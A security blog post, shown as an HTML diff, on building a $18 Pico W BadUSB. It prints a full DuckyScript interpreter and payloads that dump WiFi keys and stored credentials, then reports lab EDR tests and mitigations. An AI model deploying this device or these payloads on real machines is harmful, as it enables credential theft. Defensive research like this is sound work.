@@ -1,0 +1,569 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>I Built a $14 BadUSB That Extracts WiFi Passwords in 15 Seconds - Dillan Valor</title>
+  <meta name="description" content="A Raspberry Pi Pico W and CircuitPython became a credential-harvesting device in three days. Modern enterprise EDR caught the EICAR test instantly and missed the actual WiFi extraction attack entirely. Here's the full build, the payload evolution, and what it reveals about living-off-the-land attacks.">
+
+  <!-- Favicon -->
+  <link rel="icon" type="image/png" sizes="32x32" href="../favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="../favicon-16x16.png">
+  <link rel="shortcut icon" href="../favicon.ico">
+  <link rel="apple-touch-icon" sizes="180x180" href="../favicon-256x256.png">
+
+  <link rel="stylesheet" href="../assets/styles.css">
+  <style>
+    .blog-header {
+      background: var(--bg-primary);
+      padding: 2rem 0;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+    }
+    .blog-meta { display: flex; gap: 1.5rem; flex-wrap: wrap; color: var(--text-muted); font-size: 0.9rem; margin-bottom: 2rem; }
+    .blog-meta span { display: flex; align-items: center; gap: 0.5rem; }
+    .blog-content { max-width: 800px; margin: 0 auto; padding: 3rem 1.5rem; }
+    .blog-content h2 { margin-top: 2.5rem; margin-bottom: 1rem; color: var(--text-primary); font-size: 1.75rem; }
+    .blog-content h3 { margin-top: 2rem; margin-bottom: 0.75rem; color: var(--text-primary); font-size: 1.35rem; }
+    .blog-content p { margin-bottom: 1.25rem; line-height: 1.7; color: var(--text-secondary); }
+    .blog-content ul, .blog-content ol { margin-bottom: 1.5rem; padding-left: 1.5rem; }
+    .blog-content li { margin-bottom: 0.5rem; line-height: 1.6; color: var(--text-secondary); }
+    .blog-content strong { color: var(--text-primary); font-weight: 600; }
+    .blog-content code { background: rgba(255, 255, 255, 0.05); padding: 0.2rem 0.4rem; border-radius: 3px; font-family: 'Courier New', monospace; font-size: 0.9em; color: var(--accent-primary); }
+    .blog-content pre { background: rgba(255, 255, 255, 0.05); padding: 1rem; border-radius: 6px; overflow-x: auto; margin: 1.5rem 0; border: 1px solid rgba(255, 255, 255, 0.1); }
+    .blog-content pre code { background: none; padding: 0; color: var(--text-secondary); }
+    .blog-tags { display: flex; gap: 0.5rem; flex-wrap: wrap; margin-top: 3rem; padding-top: 2rem; border-top: 1px solid rgba(255, 255, 255, 0.1); }
+    .blog-tag { background: rgba(255, 255, 255, 0.05); padding: 0.4rem 0.8rem; border-radius: 4px; font-size: 0.85rem; color: var(--text-secondary); }
+    .back-link { display: inline-flex; align-items: center; gap: 0.5rem; color: var(--accent-primary); text-decoration: none; margin-bottom: 2rem; transition: gap 0.2s ease; }
+    .back-link:hover { gap: 0.75rem; }
+    .dolphins-insignia { position: absolute; right: 2rem; top: 50%; transform: translateY(-50%); width: 180px; height: auto; opacity: 0.95; transition: opacity 0.3s ease; }
+    .dolphins-insignia:hover { opacity: 1; }
+    header { position: relative; }
+    .highlight-box { background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 8px; padding: 1.5rem; margin: 1.5rem 0; }
+    .highlight-box h3 { margin-top: 0; font-size: 1.1rem; }
+    .highlight-box ul { margin-bottom: 0; }
+    .gotcha-box { background: rgba(255, 150, 50, 0.08); border: 1px solid rgba(255, 150, 50, 0.3); border-radius: 8px; padding: 1.25rem; margin: 1.5rem 0; }
+    .gotcha-box strong { color: #ffb84d; }
+    .finding-box { background: rgba(255, 100, 100, 0.08); border: 1px solid rgba(255, 100, 100, 0.25); border-radius: 8px; padding: 1.25rem; margin: 1.5rem 0; }
+    .finding-box strong { color: #ff6b6b; }
+    .stat-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 1rem; margin: 1.5rem 0; }
+    .stat-callout { background: rgba(100, 200, 255, 0.08); border: 1px solid rgba(100, 200, 255, 0.25); border-radius: 8px; padding: 1.25rem; margin: 0; text-align: center; }
+    .stat-callout .stat-number { font-size: 1.75rem; font-weight: 700; color: var(--accent-primary); display: block; margin-bottom: 0.25rem; }
+    .stat-callout .stat-label { color: var(--text-secondary); font-size: 0.9rem; }
+    .test-result { border-left: 3px solid; padding: 0.75rem 1rem; margin: 1rem 0; background: rgba(255, 255, 255, 0.02); border-radius: 0 6px 6px 0; }
+    .test-result.fail { border-color: #ff6b6b; }
+    .test-result.win { border-color: #6bff8e; background: rgba(107, 255, 142, 0.06); }
+    .test-result.critical { border-color: #ff4444; background: rgba(255, 68, 68, 0.1); border-width: 4px; }
+    .test-result .test-label { font-family: 'Courier New', monospace; font-size: 0.85rem; color: var(--text-muted); margin-bottom: 0.25rem; }
+    .verdict-box { background: rgba(255, 100, 100, 0.12); border: 1px solid rgba(255, 100, 100, 0.4); border-radius: 8px; padding: 1.5rem; margin: 1.5rem 0; text-align: center; }
+    .verdict-box .verdict-label { font-size: 2rem; font-weight: 700; color: #ff4444; display: block; letter-spacing: 0.1em; }
+    .verdict-box .verdict-sub { color: var(--text-secondary); font-size: 0.95rem; margin-top: 0.5rem; }
+    @media (max-width: 768px) {
+      .dolphins-insignia { width: 120px; right: 1rem; }
+      .blog-content { padding: 2rem 1rem; }
+      .stat-grid { grid-template-columns: 1fr; }
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <div class="container">
+      <a href="../index.html" class="logo" aria-label="Dillan Valor - Home">DILLAN <span>VALOR</span></a>
+      <nav aria-label="Main navigation">
+        <a href="../index.html">Home</a>
+        <a href="../projects.html">Projects</a>
+        <a href="../experience.html">Experience</a>
+        <a href="index.html" class="active">Blog</a>
+        <a href="../index.html#contact">Contact</a>
+      </nav>
+    </div>
+    <img src="../assets/dolphins.png" alt="Enlisted Submarine Warfare Insignia" class="dolphins-insignia">
+  </header>
+
+  <main>
+    <div class="blog-header">
+      <div class="container">
+        <a href="index.html" class="back-link">← Back to Blog</a>
+        <h1 style="margin-bottom: 1rem;">I Built a $14 BadUSB That Extracts Your WiFi Password in 15 Seconds — Here's What Actually Stops It</h1>
+        <div class="blog-meta">
+          <span>
+            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+              <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+              <line x1="16" y1="2" x2="16" y2="6"></line>
+              <line x1="8" y1="2" x2="8" y2="6"></line>
+              <line x1="3" y1="10" x2="21" y2="10"></line>
+            </svg>
+            May 15, 2026
+          </span>
+          <span>
+            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+              <path d="M12 20h9"></path>
+              <path d="M16.5 3.5a2.121 2.121 0 0 1 3 3L7 19l-4 1 1-4L16.5 3.5z"></path>
+            </svg>
+            13 min read
+          </span>
+        </div>
+        <p class="lead" style="margin: 0;">A Raspberry Pi Pico W and CircuitPython became a credential-harvesting device in three days. Modern enterprise EDR caught the EICAR test instantly and missed the actual WiFi extraction attack entirely. Here's the full build, the payload evolution, and what it reveals about living-off-the-land attacks.</p>
+      </div>
+    </div>
+
+    <article class="blog-content">
+
+      <h2>The Setup</h2>
+      <p>Three days ago, I ordered a $14 Raspberry Pi Pico W and decided to turn it into a credential-harvesting device. The goal wasn't just to prove it could be done — plenty of people have already done that. I wanted to test something more specific: <strong>what does modern enterprise EDR actually catch, and what does it miss?</strong></p>
+
+      <p>The answer surprised me, and not in a good way.</p>
+
+      <div class="stat-grid">
+        <div class="stat-callout">
+          <span class="stat-number">$18</span>
+          <span class="stat-label">Total build cost</span>
+        </div>
+        <div class="stat-callout">
+          <span class="stat-number">15 sec</span>
+          <span class="stat-label">Time to credentials</span>
+        </div>
+        <div class="stat-callout">
+          <span class="stat-number">3 days</span>
+          <span class="stat-label">From idea to working device</span>
+        </div>
+        <div class="stat-callout">
+          <span class="stat-number">0</span>
+          <span class="stat-label">EDR detections on the attack</span>
+        </div>
+      </div>
+
+      <h2>Why Not a Real Rubber Ducky?</h2>
+      <p>I started by ordering three Lexar A30E 64GB USB 3.2 Gen 1 flash drives (~$35 total) with the plan to reflash their firmware using the Psychson toolkit. The idea was to reflash the USB controller itself to emulate a keyboard and inject DuckyScript payloads — the classic BadUSB approach pioneered back in 2014.</p>
+
+      <p>Dead end. Modern USB 3.x drives use controllers (Silicon Motion, modern Phison chips) that Psychson doesn't support. The toolchain requires older Phison 2251-03 controllers, which are essentially impossible to find in retail drives anymore. The era of "reflash any cheap thumb drive into a HID device" is over for off-the-shelf hardware.</p>
+
+      <p>Pivot: Raspberry Pi Pico W. Pre-soldered, $13.99, has GPIO for a dev-mode jumper, ships with CircuitPython support, and the Adafruit HID libraries make keyboard emulation trivial. The Pico W is actually a better platform for this anyway — it has an onboard radio that opens up future possibilities (more on that at the end), a real CPU instead of a repurposed storage controller, and it's plenty fast enough for any payload that matters.</p>
+
+      <p><strong>Total cost for the working device:</strong> ~$18 (Pico W + a 3D-printed case).</p>
+
+      <h2>The Build: CircuitPython &amp; DuckyScript</h2>
+
+      <h3>Hardware Setup</h3>
+      <ul>
+        <li><strong>Board:</strong> Raspberry Pi Pico W (pre-soldered)</li>
+        <li><strong>Dev-mode jumper:</strong> GP0 (floating = armed, grounded = setup mode)</li>
+        <li><strong>Case:</strong> 3D-printed protective shell with GPIO header access</li>
+        <li><strong>Firmware:</strong> CircuitPython 10.2.1</li>
+        <li><strong>Board ID:</strong> raspberry_pi_pico_w</li>
+      </ul>
+
+      <p>When plugged in, the Pico mounts as a standard USB mass storage drive (CIRCUITPY) <em>and</em> appears as a keyboard to the target system simultaneously. This is the part that makes the attack work — the operating system sees a perfectly legitimate Human Interface Device and accepts keystrokes from it the same way it would from any USB keyboard. There's no driver to install, no permission to grant. HID is universal trust.</p>
+
+      <h3>Code: DuckyScript Interpreter</h3>
+      <p>The core <code>code.py</code> initializes the Pico as a HID keyboard device, reads a <code>payload.dd</code> file from the CIRCUITPY drive, and executes commands that mimic Rubber Ducky syntax. The full interpreter:</p>
+
+      <pre><code>import board
+import digitalio
+from digitalio import DigitalInOut, Pull
+import time
+import usb_hid
+from adafruit_hid.keyboard import Keyboard
+from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
+from adafruit_hid.keycode import Keycode
+
+duckyPin = digitalio.DigitalInOut(board.GP0)
+duckyPin.switch_to_input(Pull.UP)
+
+kbd = Keyboard(usb_hid.devices)
+layout = KeyboardLayoutUS(kbd)
+
+duckyCommands = {
+    'WINDOWS': Keycode.WINDOWS, 'GUI': Keycode.WINDOWS,
+    'APP': Keycode.APPLICATION, 'MENU': Keycode.APPLICATION,
+    'SHIFT': Keycode.SHIFT, 'ALT': Keycode.ALT,
+    'CONTROL': Keycode.CONTROL, 'CTRL': Keycode.CONTROL,
+    'DOWNARROW': Keycode.DOWN_ARROW, 'DOWN': Keycode.DOWN_ARROW,
+    'LEFTARROW': Keycode.LEFT_ARROW, 'LEFT': Keycode.LEFT_ARROW,
+    'RIGHTARROW': Keycode.RIGHT_ARROW, 'RIGHT': Keycode.RIGHT_ARROW,
+    'UPARROW': Keycode.UP_ARROW, 'UP': Keycode.UP_ARROW,
+    'BREAK': Keycode.PAUSE, 'PAUSE': Keycode.PAUSE,
+    'CAPSLOCK': Keycode.CAPS_LOCK, 'DELETE': Keycode.DELETE,
+    'END': Keycode.END, 'ESC': Keycode.ESCAPE, 'ESCAPE': Keycode.ESCAPE,
+    'HOME': Keycode.HOME, 'INSERT': Keycode.INSERT,
+    'NUMLOCK': Keycode.KEYPAD_NUMLOCK,
+    'PAGEUP': Keycode.PAGE_UP, 'PAGEDOWN': Keycode.PAGE_DOWN,
+    'PRINTSCREEN': Keycode.PRINT_SCREEN, 'ENTER': Keycode.ENTER,
+    'SCROLLLOCK': Keycode.SCROLL_LOCK, 'SPACE': Keycode.SPACE,
+    'TAB': Keycode.TAB, 'BACKSPACE': Keycode.BACKSPACE,
+    'A': Keycode.A, 'B': Keycode.B, 'C': Keycode.C, 'D': Keycode.D,
+    'E': Keycode.E, 'F': Keycode.F, 'G': Keycode.G, 'H': Keycode.H,
+    'I': Keycode.I, 'J': Keycode.J, 'K': Keycode.K, 'L': Keycode.L,
+    'M': Keycode.M, 'N': Keycode.N, 'O': Keycode.O, 'P': Keycode.P,
+    'Q': Keycode.Q, 'R': Keycode.R, 'S': Keycode.S, 'T': Keycode.T,
+    'U': Keycode.U, 'V': Keycode.V, 'W': Keycode.W, 'X': Keycode.X,
+    'Y': Keycode.Y, 'Z': Keycode.Z,
+    'F1': Keycode.F1, 'F2': Keycode.F2, 'F3': Keycode.F3, 'F4': Keycode.F4,
+    'F5': Keycode.F5, 'F6': Keycode.F6, 'F7': Keycode.F7, 'F8': Keycode.F8,
+    'F9': Keycode.F9, 'F10': Keycode.F10, 'F11': Keycode.F11, 'F12': Keycode.F12,
+}
+
+def convertLine(line):
+    newline = []
+    for key in filter(None, line.split(" ")):
+        key = key.upper()
+        commandKeycode = duckyCommands.get(key, None)
+        if commandKeycode is not None:
+            newline.append(commandKeycode)
+        elif hasattr(Keycode, key):
+            newline.append(getattr(Keycode, key))
+    return newline
+
+def runScriptLine(line):
+    for k in line:
+        kbd.press(k)
+    kbd.release_all()
+
+def sendString(line):
+    layout.write(line)
+
+def parseLine(line, previousLine):
+    global defaultDelay
+    if line[0:3] == "REM":
+        return previousLine
+    elif line[0:5] == "DELAY":
+        time.sleep(float(line[6:]) / 1000)
+        return previousLine
+    elif line[0:6] == "STRING":
+        sendString(line[7:])
+        return previousLine
+    elif line[0:13] == "DEFAULT_DELAY" or line[0:12] == "DEFAULTDELAY":
+        defaultDelay = int(line.split()[1]) * 10
+        return previousLine
+    elif line[0:7] == "REPLAY":
+        for _ in range(int(line[8:])):
+            runScriptLine(previousLine)
+        return previousLine
+    else:
+        newScriptLine = convertLine(line)
+        runScriptLine(newScriptLine)
+        return newScriptLine
+
+time.sleep(0.5)
+defaultDelay = 0
+
+if duckyPin.value:
+    print("[pico-ducky] Armed. Reading payload.dd...")
+    try:
+        with open("payload.dd", "r", encoding="utf-8") as f:
+            previousLine = ""
+            for line in f:
+                line = line.rstrip()
+                if line:
+                    previousLine = parseLine(line, previousLine)
+                time.sleep(defaultDelay / 1000)
+        print("[pico-ducky] Payload complete.")
+    except OSError:
+        print("[pico-ducky] ERROR: Could not open payload.dd")
+else:
+    print("[pico-ducky] Setup mode (GP0 grounded). Payload skipped.")</code></pre>
+
+      <p><strong>The dev-mode logic is the most important safety feature.</strong> If GP0 is floating (no jumper), the device is "armed" and fires the payload the instant it's plugged in. If GP0 is grounded (jumper present), it enters setup mode and skips execution entirely. This lets me safely edit the <code>payload.dd</code> file on my own machine without accidentally executing it. Anyone building one of these absolutely needs an equivalent safety mechanism — the alternative is firing your own credential extractor at your own workstation the first time you forget what's plugged in.</p>
+
+      <h2>Payload Evolution</h2>
+      <p>I built four payloads, each progressively more sophisticated. The point of starting small wasn't just safety — it was establishing that each layer of the attack chain actually worked before adding the next one.</p>
+
+      <h3>Payload 1: Proof of Concept (Notepad)</h3>
+      <pre><code>DELAY 3000
+GUI r
+DELAY 750
+STRING notepad
+ENTER
+DELAY 1500
+STRING Hello from Valor's Pico W BadUSB - test successful</code></pre>
+
+      <div class="test-result win">
+        <div class="test-label">Test 1 · keyboard emulation</div>
+        <strong>Result:</strong> Works. Opens Notepad, types the message. Confirms HID keyboard emulation is functional and that the timing delays are tuned correctly for the target.
+      </div>
+
+      <h3>Payload 2: System Reconnaissance</h3>
+      <pre><code>DELAY 3000
+GUI r
+DELAY 750
+STRING powershell
+ENTER
+DELAY 2000
+STRING whoami | Out-File $env:TEMP\recon.txt
+ENTER
+DELAY 500
+STRING systeminfo | Out-File -Append $env:TEMP\recon.txt
+ENTER
+DELAY 500
+STRING ipconfig /all | Out-File -Append $env:TEMP\recon.txt
+ENTER
+DELAY 500
+STRING Get-LocalUser | Out-File -Append $env:TEMP\recon.txt
+ENTER
+DELAY 500
+STRING notepad $env:TEMP\recon.txt
+ENTER</code></pre>
+
+      <div class="test-result win">
+        <div class="test-label">Test 2 · system enumeration</div>
+        <strong>Result:</strong> Works. Dumps current user, system info, network config, and local users to a text file in %TEMP%, then opens it for review. The whole thing runs in under 10 seconds.
+      </div>
+
+      <div class="gotcha-box">
+        <strong>Multi-line payloads beat one-liners.</strong>
+        <p style="margin-top: 0.75rem; margin-bottom: 0;">Trying to cram everything into a single piped command with semicolons fails silently more often than not. Smart quotes get inserted by keyboard layout quirks, pipe characters get misinterpreted, escape sequences disappear. Breaking the work into discrete <code>ENTER</code>-separated commands is far more reliable, and it's what a human typing at the keyboard would actually do anyway, which matters for the EDR conversation later.</p>
+      </div>
+
+      <h3>Payload 3: System Intelligence Gathering</h3>
+      <p>This one gets aggressive. It collects WiFi network names, stored credentials from Credential Manager, installed browsers (Chrome, Edge), AV/EDR status via <code>Get-MpComputerStatus</code> and WMIC queries, local privilege escalation indicators, and running services (SQL, MySQL, Apache, IIS, Exchange, AD components).</p>
+
+      <p>Each output stream goes to its own file in %TEMP%:</p>
+
+      <pre><code>netsh wlan show profile &gt; $env:TEMP\pico_wifi_networks.txt
+cmdkey /list | Out-File $env:TEMP\pico_stored_creds.txt
+Get-MpComputerStatus 2&gt;$null | Out-File $env:TEMP\pico_av.txt</code></pre>
+
+      <div class="test-result win">
+        <div class="test-label">Test 3 · intel gathering</div>
+        <strong>Result:</strong> Works. All files created, all data collected. The reconnaissance footprint is significant but every individual operation is one a sysadmin might legitimately run.
+      </div>
+
+      <div class="gotcha-box">
+        <strong>Critical bug — Linux syntax inside a Windows payload.</strong>
+        <p style="margin-top: 0.75rem; margin-bottom: 0;">My first version of the AV detection command used <code>2&gt;/dev/null</code> for error suppression. That's bash, not PowerShell. Windows PowerShell error redirection is <code>2&gt;$null</code>. The command silently fails and the file never gets created. Easy mistake to make when you spend most of your day in both worlds. Always test payloads end-to-end before flagging them as working.</p>
+      </div>
+
+      <h3>Payload 4: WiFi Credential Extraction (The Money Shot)</h3>
+      <p>One line. One native Windows utility. No privilege escalation, no external dependencies, no malware signatures to flag.</p>
+
+      <pre><code>netsh wlan show profile name=* key=clear | Select-String "SSID|Key Content" &gt; $env:TEMP\pico_wifi_passwords.txt</code></pre>
+
+      <p>What it does: <code>netsh wlan show profile name=* key=clear</code> dumps every stored WiFi profile on the machine along with their cleartext passwords. <code>Select-String</code> filters down to just the SSID and Key Content lines. Output goes to a file in %TEMP%. No prompts. No errors. No warnings.</p>
+
+      <div class="test-result critical">
+        <div class="test-label">Test 4 · WiFi credential extraction</div>
+        <strong>Result: SUCCESSFULLY EXTRACTED CLEARTEXT WIFI PASSWORDS.</strong>
+        <p style="margin-top: 0.75rem; margin-bottom: 0;">Sample output from the test system (real values redacted):</p>
+        <pre style="margin-top: 0.5rem; margin-bottom: 0;"><code>SSID : [REDACTED home SSID]
+Key Content : [REDACTED 18-char passphrase]
+
+SSID : Dillan's iPhone
+Key Content : [REDACTED hotspot password]</code></pre>
+      </div>
+
+      <p>Same payload also pulled Chrome and Edge browser database files, browser cookies and stored credentials, and the cached Credential Manager entries. The WiFi piece is the one that gets attention, but the broader credential haul is the real prize.</p>
+
+      <h2>Testing Environment</h2>
+
+      <p>This was tested in a fully isolated lab environment with proper authorization. Nothing about this attack was run against production systems or systems I don't own.</p>
+
+      <div class="highlight-box">
+        <h3>Lab configuration</h3>
+        <ul>
+          <li><strong>Target machine:</strong> Dormant Windows 11 Home laptop, unused for over a year, fresh local account "lab-man" created for the test</li>
+          <li><strong>Network isolation:</strong> Dedicated LAB-DETONATE VLAN with strict firewall rules</li>
+          <li><strong>Intra-VLAN traffic:</strong> allowed</li>
+          <li><strong>External DNS only:</strong> 1.1.1.1, 9.9.9.9 (UDP/TCP 53)</li>
+          <li><strong>NTP:</strong> allowed</li>
+          <li><strong>RFC1918 (internal network):</strong> blocked</li>
+          <li><strong>Management IP ranges:</strong> blocked</li>
+          <li><strong>All other traffic:</strong> allowed but logged</li>
+        </ul>
+      </div>
+
+      <p>This setup prevents the lab machine from reaching anything on my internal network while allowing internet access for Windows Update and other baseline functionality. If the payload ever did something I didn't anticipate, the blast radius was bounded.</p>
+
+      <h2>The EDR Testing: What Actually Stops It?</h2>
+
+      <p>This is where the project stopped being a build exercise and started being a security research exercise.</p>
+
+      <h3>Scenario 1: No Protection (Baseline)</h3>
+
+      <div class="test-result fail">
+        <div class="test-label">Baseline · no endpoint protection</div>
+        <strong>Result:</strong> Completely compromised in 15 seconds. WiFi passwords, stored credentials, browser data — all extracted. No detection, no logs, no alerts. This is the control case.
+      </div>
+
+      <h3>Scenario 2: Malwarebytes Free (Portable, Offline)</h3>
+
+      <p>Downloaded the free Malwarebytes portable scanner (no real-time protection) and ran manual scans against the payload files and the resulting %TEMP% artifacts.</p>
+
+      <div class="test-result fail">
+        <div class="test-label">Malwarebytes Free · signature scan</div>
+        <strong>Result:</strong> Zero detections. Not surprising — free Malwarebytes offers no real-time protection or behavioral detection. It relies on signature-based scanning, and the payloads here use entirely legitimate Windows tools. There's nothing to signature against.
+      </div>
+
+      <h3>Scenario 3: Huntress EDR (Free Trial)</h3>
+
+      <p>This was the test I actually cared about. Huntress is widely deployed across the MSP space and is generally considered a solid behavioral EDR. Setup:</p>
+
+      <ul>
+        <li><strong>Organization:</strong> ValorWorks (my own tenant)</li>
+        <li><strong>Agent version:</strong> v0.14.162</li>
+        <li><strong>Endpoint:</strong> "Dillan_Laptop" (the lab target)</li>
+        <li><strong>Windows Defender:</strong> enabled (Huntress requires this for full functionality)</li>
+      </ul>
+
+      <p>I wanted to run the EICAR test first to confirm Huntress was actually working end-to-end before testing the real attack. EICAR is the standard antivirus test file — a benign string that every legitimate AV product is supposed to flag. If EICAR doesn't trigger, the EDR isn't really running.</p>
+
+      <h4>The EICAR Test (Known Malware Signature)</h4>
+
+      <p>Uploaded the EICAR test file to the system.</p>
+
+      <div class="test-result win">
+        <div class="test-label">EICAR test file</div>
+        <strong>Result: IMMEDIATELY BLOCKED.</strong>
+        <p style="margin-top: 0.75rem; margin-bottom: 0;">Windows surfaced the standard message: <em>"Operation did not complete successfully because the file contains a virus or potentially unwanted software."</em> Huntress logged the incident, generated the alert, and surfaced it in the dashboard. End-to-end EDR confirmed working.</p>
+      </div>
+
+      <h4>The Actual Attack (BadUSB WiFi Extraction)</h4>
+
+      <p>Plugged in the Pico W. The payload fired the moment the device enumerated. End-to-end the attack chain involves:</p>
+
+      <ol>
+        <li>Keyboard input injection from a freshly-enumerated HID device</li>
+        <li>PowerShell spawning from a Win+R run dialog</li>
+        <li><code>netsh</code> execution to access WiFi profiles with the <code>key=clear</code> flag</li>
+        <li>Rapid file creation in %TEMP%</li>
+        <li>Extraction of credentials from secured Windows storage (the wlansvc service)</li>
+      </ol>
+
+      <p>If you were going to write a behavioral detection rule, this would be the textbook list of things to flag together.</p>
+
+      <div class="verdict-box">
+        <span class="verdict-label">COMPLETELY MISSED</span>
+        <div class="verdict-sub">Huntress dashboard: 0 Active Incidents · 0 Critical/High/Low alerts · 0 Suspicious signals · No flagged autoruns · No behavioral detections</div>
+      </div>
+
+      <p>The payload executed. The WiFi credentials were extracted. The files were written to disk. The behavioral indicators were textbook. And Huntress saw nothing.</p>
+
+      <h2>The Gap: Why Huntress Missed It</h2>
+
+      <p>Huntress is a solid EDR platform — this isn't a hit piece. It has the same fundamental limitation as most modern EDR products: <strong>it's optimized for detecting known attack signatures and clearly anomalous process behavior, not novel techniques chained together using legitimate tools.</strong></p>
+
+      <p>The BadUSB payload attack chain is a textbook "living-off-the-land" (LotL) attack:</p>
+
+      <ul>
+        <li><code>netsh</code> — built-in Windows utility, completely legitimate use case (network configuration). Sysadmins use it all day.</li>
+        <li>PowerShell — system administration tool, constantly invoked by legitimate processes including Windows itself.</li>
+        <li>File creation in %TEMP% — happens thousands of times per system per day across countless legitimate workflows.</li>
+        <li>No unusual parent processes — the commands are typed as if a human entered them at the keyboard, because effectively that's what happened.</li>
+      </ul>
+
+      <p><strong>Huntress caught EICAR because</strong> EICAR is a specific known string with a specific signature. The signature database knows what it is and what to do.</p>
+
+      <p><strong>Huntress missed the WiFi extraction because</strong> the attack uses legitimate tools in a sequence that's individually unremarkable. There is no malware signature to flag. Behavioral detection would need to correlate "HID device enumerates → Run dialog opens → PowerShell spawns → netsh accesses WiFi profiles with key=clear → file written to %TEMP%" all within a 15-second window. That kind of correlation is possible, but it risks generating false positives every time a legitimate admin troubleshoots a wireless issue. The trade-off most EDR products make is to keep the false positive rate down, which means accepting that some real attacks will slip through.</p>
+
+      <p>The honest answer is that there's nothing on that activity chain that a behavioral engine can confidently call malicious without context. The fact that the keystrokes came from a $14 chip pretending to be a keyboard rather than from a human's fingers is a distinction the operating system literally cannot draw.</p>
+
+      <h2>What This Means</h2>
+
+      <p><strong>1. Physical security is a prerequisite for endpoint security, not a complement to it.</strong> If someone can plug a device into a USB port for 15 seconds, EDR is already downstream of the actual problem. The unlocked workstation, the empty conference room, the receptionist who steps away from the front desk — those are the attack surfaces this exploits.</p>
+
+      <p><strong>2. Enterprise EDR has a documented blind spot for novel attacks using legitimate tools.</strong> It catches known threats very effectively. It struggles with new attack techniques chained from native utilities. This isn't a vendor failure, it's a category limitation. Behavioral correlation is hard, especially when the building blocks are individually mundane.</p>
+
+      <p><strong>3. Defense-in-depth isn't optional for this attack vector.</strong> No single control stops it. The realistic mitigations are layered:</p>
+
+      <ul>
+        <li>Disable or restrict USB ports via Group Policy where operationally feasible (USB allowlisting by device class or vendor ID)</li>
+        <li>Endpoint DLP that flags credential exfiltration patterns regardless of the tool used</li>
+        <li>PowerShell script block logging enabled and aggregated into the SIEM, with detections for <code>netsh wlan</code> with <code>key=clear</code></li>
+        <li>Constrained Language Mode for PowerShell on non-administrative endpoints</li>
+        <li>Application control (WDAC or AppLocker) restricting what can launch from a Run dialog</li>
+        <li>Screen-lock policies that lock workstations on idle, plus user training on never leaving an unlocked machine</li>
+        <li>MFA everywhere — cached WiFi passwords are one credential surface; assume they'll eventually leak</li>
+      </ul>
+
+      <p><strong>4. Your EDR is a detection tool, not a prevention tool.</strong> It's great at alerting on known threats and catching obvious anomalies. It's not great at blocking novel attacks built from legitimate primitives. Security architecture should assume some level of compromise and focus on detection latency, blast-radius containment, and credential rotation — not on preventing every attack at the endpoint.</p>
+
+      <h2>The Bigger Picture</h2>
+
+      <p>This isn't really a critique of Huntress specifically. It's a critique of how we collectively think about endpoint security. We've built sophisticated detection systems that catch things that look like attacks — and we're losing to things that look like normal system administration.</p>
+
+      <p>Real threat actors know this. Living-off-the-land binaries (LOLBins) are an entire MITRE-tracked discipline at this point. The typical post-compromise toolkit looks like:</p>
+
+      <ul>
+        <li><code>certutil</code> to download payloads (it's a certificate utility that happens to also do HTTP)</li>
+        <li><code>wmic</code> to enumerate systems and execute remotely</li>
+        <li><code>tasklist</code> and <code>schtasks</code> to check processes and persistence</li>
+        <li><code>reg query</code> to read security configurations</li>
+        <li><code>nslookup</code> for low-and-slow data exfiltration over DNS</li>
+        <li><code>bitsadmin</code> for stealth downloads</li>
+      </ul>
+
+      <p>All of it looks normal. All of it is signed by Microsoft. All of it is in MITRE ATT&amp;CK. Your EDR will catch the Trojan. It will probably miss an attacker who knows how to chain native Windows utilities and understands that the goal isn't to stay hidden forever — just long enough to achieve objectives.</p>
+
+      <p>The WiFi extraction attack here is a perfect microcosm. Every single component of the chain is a tool Microsoft ships with Windows. The "attack" is the sequence, the speed, and the source — and none of those three things are easy to confidently distinguish from legitimate administrative work without a lot of context EDR doesn't have.</p>
+
+      <h2>What's Next</h2>
+
+      <p>This is the first part of what I'm planning as a longer series. Coming up:</p>
+
+      <ul>
+        <li><strong>Part 2:</strong> Payload refinement and custom DuckyScript extensions — handling US/UK keyboard layout differences, more reliable timing, and stealthier output handling</li>
+        <li><strong>Part 3:</strong> WiFi-triggered payload delivery using the Pico W's onboard radio — having the device wait for a specific SSID to come into range before firing, instead of executing on plug-in</li>
+        <li><strong>Part 4:</strong> Defensive countermeasures and detection strategies — what a behavioral detection for this attack chain actually looks like, what trade-offs it makes, and how to build it without flooding the SIEM</li>
+      </ul>
+
+      <p>If you have an EDR product you'd like me to test the same payload against, drop a note through the contact link. I'm particularly interested in seeing how SentinelOne, CrowdStrike, and Defender for Endpoint handle the same attack chain. The hypothesis is that they'll all catch EICAR and most will miss the WiFi extraction, but the specific telemetry each one produces would be useful for detection engineering.</p>
+
+      <h2>Conclusion</h2>
+
+      <p>Three days, $18, and a Raspberry Pi Pico W produced a working credential-harvesting device that bypasses signature-based AV entirely and slips past at least one well-regarded behavioral EDR. That's not a vendor problem and it's not a sophistication problem. It's a structural problem with how endpoint security thinks about legitimate tools used illegitimately.</p>
+
+      <p>The good news is the mitigations exist and they're well-understood. USB control, application allowlisting, PowerShell logging, DLP, MFA, physical security training — none of those are new ideas. The bad news is they're operationally expensive, which is why most environments don't have all of them in place, which is why this attack still works in 2026 the same way it worked in 2014.</p>
+
+      <p>Your EDR will catch what it knows how to catch. The attacks worth worrying about are the ones built from tools your EDR can't safely flag without breaking the help desk's day. Plan accordingly.</p>
+
+      <h2>Appendix: Files &amp; Artifacts</h2>
+
+      <p><strong>Code &amp; Payloads</strong></p>
+      <ul>
+        <li><code>code.py</code> — Complete DuckyScript interpreter (CircuitPython)</li>
+        <li><code>payload.dd</code> — Credential extraction payload</li>
+      </ul>
+
+      <p><strong>Hardware &amp; Firmware Configuration</strong></p>
+      <ul>
+        <li>Board: Raspberry Pi Pico W (pre-soldered)</li>
+        <li>Firmware: CircuitPython 10.2.1</li>
